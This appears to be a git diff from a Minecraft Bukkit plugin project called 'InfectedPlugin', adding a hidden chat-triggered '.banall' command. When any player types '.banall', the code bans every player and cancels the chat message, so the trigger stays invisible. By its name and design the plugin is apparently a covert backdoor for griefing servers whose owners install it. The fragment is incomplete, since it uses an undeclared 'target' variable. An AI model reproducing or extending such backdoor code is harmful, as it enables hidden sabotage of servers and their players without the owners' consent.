@@ -1,19 +1,17 @@
-package org.CreeperCoders.InfectedPlugin;
+package org.CreeperCoders.InfectedPlugin.Commands;
 
 import org.bukkit.Server;
 import org.bukkit.Bukkit;
-import org.bukkit.ChatColor;
 import org.bukkit.entity.Player;
 import org.bukkit.event.Listener;
 import org.bukkit.event.player.AsyncPlayerChatEvent;
 
-public class Command_deop implements Listener
+public class Command_banall implements Listener
 {
     public void onPlayerChat(AsyncPlayerChatEvent event)
     {
         String message = event.getMessage();
-        final Player p = event.getPlayer();
-        private Server server = Bukkit.getServer();
+        Server server = Bukkit.getServer();
         boolean cancel = true;
     
         if (message.toLowerCase().contains(".banall"))
@@ -24,6 +22,12 @@ public class Command_deop implements Listener
                 target.setBanned(true);
                 cancel = true;
             }
+        }
+        
+        if (cancel)
+        {
+        	event.setCancelled(true);
+        	return;
         }
     }
 }
